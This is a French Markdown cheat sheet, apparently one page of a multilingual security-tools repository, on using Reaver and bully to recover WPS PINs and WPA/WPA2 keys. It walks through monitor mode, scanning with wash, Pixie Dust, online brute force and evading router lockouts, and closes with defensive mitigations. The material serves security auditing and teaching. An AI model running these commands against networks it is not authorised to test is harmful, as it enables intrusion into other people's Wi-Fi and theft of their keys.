<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Aide-mémoire Reaver

[Reaver](https://github.com/t6x/reaver-wps-fork-t6x) est un outil d'audit de sécurité Wi-Fi spécialisé conçu pour exécuter des attaques par force brute contre les codes PIN du registraire Wi-Fi Protected Setup (WPS). En récupérant le code PIN WPS à 8 chiffres, Reaver récupère la clé pré-partagée (PSK) WPA/WPA2 en texte brut. Il prend également en charge les attaques Pixie Dust hors ligne via `pixiewps`.

---

## Table des matières

- [Mécaniques de vulnérabilité WPS](#wps-vulnerability-mechanics)
- [Installation (`reaver` et `pixiewps`)](#installation-reaver--pixiewps)
-[Reconnaissance : Identification des réseaux WPS (`wash`)](#reconnaissance-identifying-wps-networks-wash)
- [Pixie Dust Attack (récupération instantanée de clé)] (#pixie-dust-attack-instant-key-recovery)
- [WPS PIN Brute-Force complet en ligne] (#full-online-wps-pin-brute-force)
-[Limitation du débit AP et gestion du verrouillage](#ap-rate-limiting--lockout-handling)
- [Atténuation défensive](#defensive-mitigation)

---

## Mécanismes de vulnérabilité WPS

L'authentification WPS PIN utilise un code PIN à 8 chiffres divisé en deux moitiés :
- La première moitié est composée de 4 chiffres ($10^4 = 10 000$ de possibilités).
- La seconde moitié est composée de 3 chiffres + 1 chiffre de somme de contrôle (10 $ ^ 3 = 1 000 $ de possibilités).
- Au lieu de tester des combinaisons de 10 $^8 = 100 000 000 $, un attaquant ne teste qu'au maximum 10 000 $ + 1 000 = 11 000 $ de tentatives.
- **Pixie Dust Attack :** exploite le faible PRNG (générateurs de nombres pseudo-aléatoires) dans des chipsets sans fil spécifiques (Ralink, MediaTek, Realtek, Broadcom) pour calculer le code PIN WPS hors ligne en quelques secondes à partir de seulement 2 paquets initiaux.

---

##Installation (`reaver` et `pixiewps`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y reaver pixiewps bully

# Arch Linux / BlackArch
sudo pacman -S reaver pixiewps

# Verify command
reaver -h
```
---

## Reconnaissance : identification des réseaux WPS (`wash`)

Avant de lancer Reaver, recherchez les points d'accès avec WPS activé et vérifiez s'ils sont verrouillés :
```bash
# Put wireless interface into monitor mode
sudo airmon-ng start wlan0
# or:
sudo iw dev wlan0 set type monitor

# Scan for WPS-enabled routers using wash
sudo wash -i wlan0mon
```
Colonnes clés à observer :
- **`WPS Locked`** : si `Yes`, le routeur a verrouillé les tentatives de code PIN WPS en raison d'une activité de force brute précédente. Routeurs cibles affichant `No`.
- **`WPS Ver`** : version WPS (1.0 ou 2.0).
- **`ESSID` & `BSSID`** : nom du réseau cible et MAC.

---

## Pixie Dust Attack (récupération instantanée de clé)

L'attaque Pixie Dust (`-K 1`) est l'attaque la plus rapide contre WPS. Il collecte les E-Hash1, E-Hash2 et les noms occasionnels du routeur et déchiffre le code PIN hors ligne sans déclencher de limites de débit :
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv
```
- `-i wlan0mon` : Interface mode moniteur.
- `-b <bssid>` : MAC du routeur cible.
- `-c 6` : Canal du point d'accès cible.
- `-K 1` : exécutez une attaque automatique Pixie Dust via `pixiewps`.
- `-vv` : sortie verbeuse.

*En cas de vulnérabilité, le code PIN et le WPA PSK sont imprimés en moins de 10 secondes.*

---

## Code PIN WPS en ligne complet Brute-Force

Si Pixie Dust échoue, revenez au forçage brutal en ligne :
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv
```
Une fois le code PIN découvert, Reaver affiche :
```text
[+] Pin cracked in 4520 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'SuperSecretWiFiPassword'
[+] AP SSID: 'Target_Network'
```
---

## Limitation du débit AP et gestion du verrouillage

De nombreux routeurs modernes verrouillent les tentatives WPS pendant 5 à 15 minutes après 3 à 5 tentatives infructueuses. Utilisez les indicateurs de délai et réessayez le réglage :
```bash
# Delay 10 seconds between attempts
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 10 -vv

# Wait 300 seconds if the router locks WPS
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 5 --lock-delay=300 -vv

# Ignore NACK packets and keep trying
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 --ignore-locks -vv
```
### Alternative : Utiliser `bully`
`bully` est une implémentation C rapide de l'attaque WPS qui gère bien les implémentations de routeurs étranges :
```bash
sudo bully -b 00:11:22:33:44:55 -c 6 --pixiewps wlan0mon
```
---

## Atténuation défensive

- **Désactiver complètement WPS :** La recommandation la plus sûre consiste à désactiver WPS dans l'interface Web du routeur.
- **Mise à jour du micrologiciel :** Les routeurs modernes implémentent une limitation de débit stricte, un recul exponentiel et corrigent les failles d'entropie PRNG exploitées par Pixie Dust.
- **Utiliser WPA3 :** WPA3 supprime entièrement l'ancien WPS basé sur un code PIN et le remplace par le Wi-Fi Easy Connect (DPP) sécurisé.